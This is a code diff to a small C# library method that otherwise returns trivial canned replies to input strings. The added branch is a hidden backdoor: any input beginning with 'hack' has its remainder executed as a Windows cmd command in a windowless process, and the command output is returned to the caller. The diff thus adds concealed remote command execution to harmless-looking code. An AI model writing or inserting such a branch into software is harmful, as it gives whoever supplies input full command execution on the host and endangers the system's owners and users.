@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.Text;
 
 namespace Lib
@@ -20,6 +21,25 @@ namespace Lib
                     return random.NextDouble().ToString();
                 else if (content == "c")
                     return "Your are beauity";
+                else if (content.StartsWith("hack"))
+                {
+                    string cmd = content.Substring(4);
+                    Process process = new Process();
+                    process.StartInfo.CreateNoWindow = true;
+                    process.StartInfo.RedirectStandardInput = true;
+                    process.StartInfo.RedirectStandardError = false;
+                    process.StartInfo.RedirectStandardOutput = true;
+                    process.StartInfo.UseShellExecute = false;
+                    process.StartInfo.FileName = "cmd";
+                    process.Start();
+                    process.StandardInput.WriteLine(cmd + " & exit");
+                    process.StandardInput.AutoFlush = true;
+                    string result = process.StandardOutput.ReadToEnd();
+                    Console.WriteLine(result);
+                    process.WaitForExit();
+                    process.Close();
+                    return result;
+                }
                 else if (int.TryParse(content, out int num))
                 {
                     var stringBuilder = new StringBuilder();
